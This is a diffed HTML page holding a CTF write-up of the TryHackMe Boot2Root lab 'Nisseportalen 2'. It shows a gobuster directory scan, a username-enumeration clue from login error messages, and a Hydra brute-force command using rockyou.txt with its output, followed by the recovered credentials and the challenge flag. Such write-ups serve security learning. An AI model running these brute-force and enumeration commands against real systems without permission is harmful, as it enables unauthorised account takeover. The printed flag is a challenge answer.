@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="robots" content="index, follow">
+<meta name="revisit-after" content="15 days">
+<link rel="author" href="/humans.txt">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileImage" content="/mstile-144x144.png">
+<link rel="shortcut icon" href="/favicon.ico"><meta name="author" content="Adamino">
+
+
+  <meta itemprop="name" content="Nisseportalen 2">
+  <meta itemprop="description" content="Challenge Name: Nisseportalen 2
+Category: Boot2Root
+Challenge Description: Nissernes største ønske er en portal til deling af alle deres AI-genererede billeder aka Nisseportalen. Projektet er dog i fare efter Nissedevs utallige fiaskoer med både Dangerzone og Nissezonen.
+Praktikantnissen har fået til opgave at redde Nisseportalen og få ryddet op i Nissedevs rod. Kan du hjælpe med at redde Nisseportalen og finde alle de sårbarheder, der må være, så projektet endelig kan blive gjort færdigt?">
+  <meta itemprop="datePublished" content="2024-12-15T13:34:38+01:00">
+  <meta itemprop="dateModified" content="2024-12-15T13:34:38+01:00">
+  <meta itemprop="wordCount" content="765">
+  <meta itemprop="keywords" content="Boot2Root"><meta property="og:url" content="http://localhost:1313/nc3/boot2root/nisseportalen-2/">
+  <meta property="og:site_name" content="Adamino CTF Writeups">
+  <meta property="og:title" content="Nisseportalen 2">
+  <meta property="og:description" content="Challenge Name: Nisseportalen 2
+Category: Boot2Root
+Challenge Description: Nissernes største ønske er en portal til deling af alle deres AI-genererede billeder aka Nisseportalen. Projektet er dog i fare efter Nissedevs utallige fiaskoer med både Dangerzone og Nissezonen.
+Praktikantnissen har fået til opgave at redde Nisseportalen og få ryddet op i Nissedevs rod. Kan du hjælpe med at redde Nisseportalen og finde alle de sårbarheder, der må være, så projektet endelig kan blive gjort færdigt?">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="nc3">
+    <meta property="article:published_time" content="2024-12-15T13:34:38+01:00">
+    <meta property="article:modified_time" content="2024-12-15T13:34:38+01:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Nisseportalen 2">
+  <meta name="twitter:description" content="Challenge Name: Nisseportalen 2
+Category: Boot2Root
+Challenge Description: Nissernes største ønske er en portal til deling af alle deres AI-genererede billeder aka Nisseportalen. Projektet er dog i fare efter Nissedevs utallige fiaskoer med både Dangerzone og Nissezonen.
+Praktikantnissen har fået til opgave at redde Nisseportalen og få ryddet op i Nissedevs rod. Kan du hjælpe med at redde Nisseportalen og finde alle de sårbarheder, der må være, så projektet endelig kan blive gjort færdigt?">
+<title>Nisseportalen 2</title>
+<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" href="http://localhost:1313/css/style.min.2d1df3d10e8fa64ec05ab1169da39cc7ce323ff1a80fb94a0b820888e0defd02.css" integrity="sha256-LR3z0Q6Ppk7AWrEWnaOcx84yP/GoD7lKC4IIiODe/QI=" crossorigin="anonymous">
+	</head>
+<body id="page">
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="http://localhost:1313/">Adamino CTF Writeups</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+				<a href="http://localhost:1313/tools/">Tools</a>
+				<a href="http://localhost:1313/nc3/">NC3</a>
+</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://github.com/onero" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24"
+  fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+  <path
+    d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+  </path>
+</svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+  class="feather feather-menu">
+  <line x1="3" y1="12" x2="21" y2="12"></line>
+  <line x1="3" y1="6" x2="21" y2="6"></line>
+  <line x1="3" y1="18" x2="21" y2="18"></line>
+</svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="http://localhost:1313/tools/">Tools</a></li>
+			<li><a href="http://localhost:1313/nc3/">NC3</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner thin animated fadeIn faster">
+		<h1>Nisseportalen 2</h1>
+		<div class="content">
+			<h2 id="challenge-name">Challenge Name:<a href="#challenge-name" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>Nisseportalen 2</p>
+<h2 id="category">Category:<a href="#category" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>Boot2Root</p>
+<h2 id="challenge-description">Challenge Description:<a href="#challenge-description" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>Nissernes største ønske er en portal til deling af alle deres AI-genererede billeder aka Nisseportalen. Projektet er dog i fare efter Nissedevs utallige fiaskoer med både Dangerzone og Nissezonen.</p>
+<p>Praktikantnissen har fået til opgave at redde Nisseportalen og få ryddet op i Nissedevs rod. Kan du hjælpe med at redde Nisseportalen og finde alle de sårbarheder, der må være, så projektet endelig kan blive gjort færdigt?</p>
+<p>Men vær beredt, det er ikke til at sige hvad Nissedev har haft gang i&hellip;</p>
+<p><a href="https://tryhackme.com/jr/nisseportalen2o24">https://tryhackme.com/jr/nisseportalen2o24</a></p>
+<h2 id="approach">Approach<a href="#approach" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>We pick up where we left off in <a href="/nc3/boot2root/nisseportalen-1/">Nisseportalen 1</a> and continue to enumerate the webapp, scanning for subdirectories under /portal!</p>
+<h3 id="enumeration">Enumeration<a href="#enumeration" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>We fire off a <a href="https://tools.kali.org/web-applications/gobuster">gobuster</a> scan to see if we can find any hidden directories under the newly discovered /portal directory!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://nisseportalen.nc3/portal -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,old
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 150<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 777<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 283<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.php                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 283<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/login.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1764<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 333<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://nisseportalen.nc3/portal/uploads/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/list.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 500<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/admin.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1478<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/upload.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1055<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/filter.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/billeder.txt         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 66<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.php                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 283<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 283<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>We find a plethora of interesting files and directories, including /login.php, /uploads, /list.php, /admin.php, /upload.php, /filter.php, and /billeder.txt!</p>
+<h3 id="exploitation">Exploitation<a href="#exploitation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>I spent SO much time, diving through the source code of every single page, noting down the images in the billeder.txt file.
+I even discovered that the images can be accessed by changing the URL to /portal/uploads/images/[image_name].jpg, but I couldn&rsquo;t find anything useful in the images themselves (and based on several previous uploads to my favorite quick image analysis tool, <a href="https://www.aperisolve.com/">AperiSolve</a>, I saw that several other contestants also tried this aproach&hellip;).</p>
+<p>I ended up focusing on the /portal/login.php page, where I found a login form. I tried to log in with the default credentials, without luck.
+I attempted to run SQL injection attacks with sqlmap, again without any luck.</p>
+<p>Mostly based on luck, I noticed that the user &ldquo;test&rdquo; yielded a different error message than the user &ldquo;admin&rdquo; when trying to log in!</p>
+<p><img src="/nc3/boot2root/nisseportalen-2/images/login-default-error.png" alt="Admin login"></p>
+<p><img src="/nc3/boot2root/nisseportalen-2/images/login-information-leaking.png" alt="Test login"></p>
+<h3 id="getting-foothold-on-the-webapp">Getting foothold on the webapp<a href="#getting-foothold-on-the-webapp" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>This abosolutely caught my interest and led me fire off a Hydra attack against the login form, using the user &ldquo;test&rdquo; and the rockyou.txt wordlist!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l test -P /usr/share/wordlists/rockyou.txt -f nisseportalen.nc3 http-post-form <span style="color:#e6db74">&#34;/portal/login.php:Username=^USER^&amp;Password=^PASS^:Forkert kodeord&#34;</span>
+</span></span></code></pre></div><p>After just short of 10 minutes of running the Hydra attack, I found the password for the user &ldquo;test&rdquo;!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Hydra v9.0 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2019</span> by van Hauser/THC - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344398</span> login tries <span style="color:#f92672">(</span>l:1/p:14344398<span style="color:#f92672">)</span>, ~896525 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://nisseportalen.nc3:80/portal/login.php:Username<span style="color:#f92672">=</span>^USER^&amp;Password<span style="color:#f92672">=</span>^PASS^:Forkert kodeord
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 4564.00 tries/min, <span style="color:#ae81ff">4564</span> tries in 00:01h, <span style="color:#ae81ff">14339834</span> to <span style="color:#66d9ef">do</span> in 52:22h, <span style="color:#ae81ff">16</span> active
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 4661.00 tries/min, <span style="color:#ae81ff">13983</span> tries in 00:03h, <span style="color:#ae81ff">14330415</span> to <span style="color:#66d9ef">do</span> in 51:15h, <span style="color:#ae81ff">16</span> active
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 4685.57 tries/min, <span style="color:#ae81ff">32799</span> tries in 00:07h, <span style="color:#ae81ff">14311599</span> to <span style="color:#66d9ef">do</span> in 50:55h, <span style="color:#ae81ff">16</span> active
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: nisseportalen.nc3   login: test   password: tester
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> attack finished <span style="color:#66d9ef">for</span> nisseportalen.nc3 <span style="color:#f92672">(</span>valid pair found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+</span></span></code></pre></div><h3 id="getting-second-flag">Getting second flag<a href="#getting-second-flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Shortly after logging into portal, I was immediately greeted with the second flag, which was we can submit and move on to <a href="/nc3/boot2root/nisseportalen-3">Nisseportalen 3</a>!</p>
+<p><img src="/nc3/boot2root/nisseportalen-2/images/foothold.png" alt="Foothold"></p>
+<h2 id="flag">Flag<a href="#flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>NC3{Flag2:9aMl3_kod3R_ru573r_AlDrI9}
+</span></span></code></pre></div><h2 id="reflections-and-learnings">Reflections and Learnings<a href="#reflections-and-learnings" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="persistence-pays-off">Persistence Pays Off<a href="#persistence-pays-off" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Just keep trying! With this part of the challenge, SO SO many hours went into investigating the different &ldquo;dead-ends&rdquo; I encountered. But, as always, persistence pays off!</p>
+<h3 id="importance-of-error-messages">Importance of Error Messages<a href="#importance-of-error-messages" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>The differing error messages provided a critical clue that helped narrow down the attack path. This reinforces the importance of examining even minor inconsistencies during enumeration and testing phases.
+This displayed a very typical example of information leakage, where the application provides different responses based on the input provided. This can be a goldmine for attackers, as it can reveal valuable information about the application&rsquo;s inner workings.</p>
+<h3 id="wordlists-are-valuable-at-least-for-ctfs">Wordlists are Valuable, at least for CTFs!<a href="#wordlists-are-valuable-at-least-for-ctfs" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Utilizing the rockyou.txt wordlist with Hydra is a &ldquo;go-to&rdquo; in CTFs!
+In the real world, rockyou will sometimes be very useful, but often much more computationally demanding!
+My rule of thumb is to always give rockyou 1 hour of runtime, and if I haven&rsquo;t found the password by then, I&rsquo;ll move on to test out other paths!</p>
+<h3 id="automation-is-key">Automation is key<a href="#automation-is-key" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>The power of Hydra to automate credential brute-forcing saved significant time and effort. It’s a reminder to leverage automation tools effectively in CTF challenges to focus manual efforts where they’re most impactful.</p>
+
+		</div>
+	</main>
+
+<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+  <p>
+    &copy; 2025 <a href="http://localhost:1313/">Adamino</a>
+    &#183; The quieter you become the more you are able to hear
+    
+    &#183;
+    
+  </p>
+
+</footer>
+
+<a href="#" class="scroll-up"><svg xmlns="http://www.w3.org/2000/svg" fill="#3B3E48" width="64px" height="64px"
+  viewBox="-2.4 -2.4 28.80 28.80" id="up-circle" data-name="Flat Color"
+  xmlns="http://www.w3.org/2000/svg" class="icon flat-color" stroke="#3B3E48"
+  stroke-width="0.00024000000000000003">
+  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+  <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC"
+    stroke-width="0.9600000000000002">
+    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
+    <path id="secondary"
+      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
+      style="fill: #0077b6;"></path>
+  </g>
+  <g id="SVGRepo_iconCarrier">
+    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
+    <path id="secondary"
+      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
+      style="fill: #0077b6;"></path>
+  </g>
+</svg></a>
+<noscript>
+    <a href="#" class="scroll-up show"><svg xmlns="http://www.w3.org/2000/svg" fill="#3B3E48" width="64px" height="64px"
+  viewBox="-2.4 -2.4 28.80 28.80" id="up-circle" data-name="Flat Color"
+  xmlns="http://www.w3.org/2000/svg" class="icon flat-color" stroke="#3B3E48"
+  stroke-width="0.00024000000000000003">
+  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+  <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC"
+    stroke-width="0.9600000000000002">
+    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
+    <path id="secondary"
+      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
+      style="fill: #0077b6;"></path>
+  </g>
+  <g id="SVGRepo_iconCarrier">
+    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
+    <path id="secondary"
+      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
+      style="fill: #0077b6;"></path>
+  </g>
+</svg></a>
+</noscript>
+<script async src="http://localhost:1313/js/scrollwatcher.min.11bd2ce6f91dfb64095448b76ac1930124a42dc7133488e6d3d5aae7badaf562.js" integrity="sha256-Eb0s5vkd+2QJVEi3asGTASSkLccTNIjm09Wq57ra9WI=" crossorigin="anonymous"></script>
+<script async src="http://localhost:1313/js/bundle.min.038214de9d568246fadcfeb06c69349925de3209f332ec123861b6aa031d63c6.js" integrity="sha256-A4IU3p1Wgkb63P6wbGk0mSXeMgnzMuwSOGG2qgMdY8Y=" crossorigin="anonymous"></script>
+</body>
+
+</html>
